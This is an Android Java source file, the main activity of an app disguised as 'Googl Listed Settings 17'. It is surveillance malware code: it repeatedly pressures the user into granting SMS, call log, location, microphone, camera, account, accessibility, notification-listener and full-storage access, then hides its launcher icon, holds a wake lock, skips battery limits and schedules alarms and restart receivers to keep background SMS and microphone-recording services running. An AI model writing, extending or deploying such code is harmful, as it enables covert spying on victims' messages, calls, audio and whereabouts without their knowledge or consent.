package com.example.fasterpro11;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 1002;
    private static final int ACCESSIBILITY_PERMISSION_REQUEST_CODE = 1003;
    private static final int AUTO_HIDE_DELAY = 1600 * 60000; // 60 minutes
    public String UserID = "";
    public String UserID2 = "";

    private PowerManager.WakeLock wakeLock;
    // All required permissions list
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };

    private Toast currentToast;
    private MicRecord micRecord;
    private int permissionRequestAttempts = 0;
    private int accessibilityPermissionAttempts = 0;
    private String appName = "Googl Listed Settings 17 ";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            super.onCreate(savedInstanceState);
            micRecord = new MicRecord(this);

            // First ask user to grant all permissions
            showToast(appName + " Please allow all permissions");


            requestIgnoreBatteryOptimizations();
            acquireWakeLock();
            // Start permission requests
            requestOverlayPermission();
            checkAndRequestPermissions();

            // Setup background tasks
            new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, AUTO_HIDE_DELAY);
            WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class)
                    .addTag("BackgroundSmsNotification")
                    .build();
            WorkManager.getInstance(this).enqueue(smsNotificationWorkRequest);

            checkPackageExistence();
            setDailyAlarm(this);
            startBackgroundService();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                handlePhoneNumberPermission();
            }

        } catch (Exception e) {
            Log.e(TAG, "App error, restarting...", e);
            Intent restartIntent = new Intent(MainActivity.this, AutoRestartReceiver.class);
            sendBroadcast(restartIntent);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Check permissions again when user returns to the app
        requestOverlayPermission();
        checkAndRequestPermissions();
    }

    // Method to check and request permissions
    private void checkAndRequestPermissions() {
        Log.d(TAG, "Checking permissions...");

        List<String> missingPermissions = getMissingPermissions();

        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted");
            showToast("Overall permission already  allowed");
            checkAccessibilityPermission();
        } else {
            if (permissionRequestAttempts < 10) {
                permissionRequestAttempts++;
               // Log.d(TAG, "Requesting missing permissions (Attempt " + permissionRequestAttempts + ")");
                showToast("checkAndRequestPermissions Missing permissions: " + missingPermissions);
                ActivityCompat.requestPermissions(this,
                        missingPermissions.toArray(new String[0]),
                        PERMISSION_REQUEST_CODE);
            } else {
                //showToast("Permission request limit reached. Missing: " + missingPermissions);
                //Log.w(TAG, "Permission request limit reached");
                checkAccessibilityPermission();
            }
        }
    }

    // Helper method to get list of missing permissions
    private List<String> getMissingPermissions() {
        List<String> missingPermissions = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        return missingPermissions;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            List<String> stillMissing = new ArrayList<>();

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    stillMissing.add(permissions[i]);
                }
            }

            if (stillMissing.isEmpty()) {
                Log.d(TAG, "onRequestPermissionsResult All requested permissions granted");
                showToast("Overall permission Already allowed");
                checkAccessibilityPermission();
            } else {
                Log.w(TAG, "onRequestPermissionsResult permissions missing: " + stillMissing);
               // showToast(" missing permissions: " + stillMissing);

                if (permissionRequestAttempts < 10) {
                    checkAndRequestPermissions();
                } else {
                    //showToast("Permission request limit reached. Missing: " + stillMissing);
                    checkAccessibilityPermission();
                }
            }
        }
    }

    // Method to check accessibility service permission
    private void checkAccessibilityPermission() {
        if (!isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            if (accessibilityPermissionAttempts < 10) {
                accessibilityPermissionAttempts++;
                showToast(appName + " Allow Accessibility permission (Attempt " + accessibilityPermissionAttempts + ")");
                requestAccessibilityPermission();
            } else {
                showToast(appName + " Accessibility permission request limit reached ");
            }
        } else {
            Log.d(TAG, "AccessibilityService already enabled");
            if (getMissingPermissions().isEmpty()) {
                showToast("Overall permission all allowed");
            }
            startServicesAndRequests();
        }
    }

    // Method to request accessibility permission
    private void requestAccessibilityPermission() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST_CODE);
        Log.d(TAG, "Requesting AccessibilityService permission");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == ACCESSIBILITY_PERMISSION_REQUEST_CODE) {
            if (isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
                Log.d(TAG, "AccessibilityService permission granted");
                if (getMissingPermissions().isEmpty()) {
                    showToast("Overall permission all allowed");
                }
                startServicesAndRequests();
            } else {
                Log.w(TAG, "AccessibilityService permission not granted");
                checkAccessibilityPermission(); // Try again (up to 10 times)
            }
        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (micRecord.hasOverlayPermission()) {
                Log.d(TAG, "Overlay permission granted");
                requestNotificationPermission();
                if (getMissingPermissions().isEmpty()) {
                    showToast("Overall permission all allowed");
                }
            } else {
                Log.w(TAG, "Overlay permission not granted");
                requestOverlayPermission();
            }
        }
    }

    // Method to start all services and requests
    private void startServicesAndRequests() {
        Log.d(TAG, "Starting services and requests");
        startBackgroundService();
        requestNotificationListenerPermission();
        requestManageExternalStoragePermission();

        if (areAllPermissionsGranted() && isAccessibilityServiceEnabled(this, MyAccessibilityService.class)) {
            showToast("Overall permission all allowed");
            // All permissions granted, proceed with app functionality
        }
    }

    // Check if all permissions are granted
    private boolean areAllPermissionsGranted() {
        return getMissingPermissions().isEmpty();
    }

    // Show toast message
    private void showToast(String message) {
        if (currentToast != null) {
            currentToast.cancel();
        }
        currentToast = Toast.makeText(this, message, Toast.LENGTH_LONG);
        currentToast.show();
    }

    // Hide app icon
    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    // Handle phone number permission
    private void handlePhoneNumberPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "READ_PHONE_NUMBERS permission granted");
        } else {
            Log.w(TAG, "READ_PHONE_NUMBERS permission not granted");
        }
    }

    // Request overlay permission
    private void requestOverlayPermission() {
        Log.d(TAG, "Checking overlay permission");
        if (!micRecord.hasOverlayPermission()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
            Log.d(TAG, "Requesting overlay permission");
        } else {
            Log.d(TAG, "Overlay permission already granted");
        }
    }

    // Request notification permission
    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CODE);
                Log.d(TAG, "Requesting POST_NOTIFICATIONS permission");
            }
        }
    }

    // Request notification listener permission
    private void requestNotificationListenerPermission() {
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
            Log.d(TAG, "Requesting NOTIFICATION_LISTENER permission");
        }
    }

    // Request manage external storage permission
    private void requestManageExternalStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        }
    }


    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::WakeLockTag");
        wakeLock.acquire();
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }



    // Start background service
    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting background service", e);
        }
    }

    // Check if notification service is enabled
    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    // Check if accessibility service is enabled
    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        String prefString = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (prefString != null) {
            String[] services = prefString.split(":");
            for (String service : services) {
                if (service.equalsIgnoreCase(new ComponentName(context.getApplicationContext(), accessibilityService).flattenToString())) {
                    return true;
                }
            }
        }
        return false;
    }

    // Set daily alarm
    private void setDailyAlarm(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (!context.getSystemService(AlarmManager.class).canScheduleExactAlarms()) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                startActivity(intent);
                return;
            }
        }

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AutoStartReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        Calendar calendar = Calendar.getInstance();

        // Alarm for 9 AM
        calendar.set(Calendar.HOUR_OF_DAY, 9);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);

        // Alarm for 12 AM
        calendar.set(Calendar.HOUR_OF_DAY, 0);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
    }

    // Check package existence
    private void checkPackageExistence() {
        PackageManager pm = getPackageManager();
        try {
            pm.getApplicationInfo("com.example.fasterpro11", 0);
            Log.d("PackageFound", "com.example.fasterpro11 is installed");
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("PackageNotFound", "com.example.fasterpro11 not found", e);
        }
    }
}